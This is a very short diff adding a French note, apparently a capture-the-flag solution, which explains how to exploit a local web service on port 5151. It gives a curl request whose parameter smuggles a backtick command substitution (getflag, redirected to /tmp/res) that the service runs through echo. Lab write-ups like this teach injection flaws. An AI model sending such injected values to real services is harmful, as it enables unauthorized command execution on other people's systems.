@@ -1,0 +1,5 @@
+envoyer la commande suivante:
+curl http://127.0.0.1:5151?l="\`getflag\` > /tmp/res"
+
+permet de mettre dans l qui va etre exec par echo le getflag tout en redirigeant
+pour voir l output
